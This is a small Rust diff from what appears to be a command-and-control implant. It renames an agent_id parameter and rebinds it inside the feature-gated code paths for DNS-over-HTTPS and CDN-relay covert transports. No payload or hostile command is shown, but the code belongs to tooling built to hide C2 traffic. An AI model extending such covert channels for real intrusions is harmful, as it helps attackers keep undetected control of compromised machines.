@@ -191,7 +191,7 @@ pub async fn build_outbound_transport(
     addr: &str,
     secret: &str,
     cert_fp: Option<&str>,
-    agent_id: &str,
+    _agent_id: &str,
 ) -> Result<Box<dyn Transport + Send>> {
     // Load config once; shared by the covert-transport selection block below
     // and the traffic_profile assignment in the TLS fallback path.
@@ -230,6 +230,7 @@ pub async fn build_outbound_transport(
                 // transport that can never receive commands.
                 #[cfg(feature = "doh-transport")]
                 if cfg.malleable_profile.dns_over_https {
+                    let agent_id = _agent_id;
                     let server_url = cfg
                         .malleable_profile
                         .doh_server_url
@@ -258,6 +259,7 @@ pub async fn build_outbound_transport(
                 // proxy — see docs/C_SERVER.md.
                 #[cfg(feature = "http-transport")]
                 if cfg.malleable_profile.cdn_relay {
+                    let agent_id = _agent_id;
                     info!("http-transport: cdn_relay=true; switching to HttpTransport");
                     let session = CryptoSession::from_shared_secret(secret.as_bytes());
                     return Ok(Box::new(
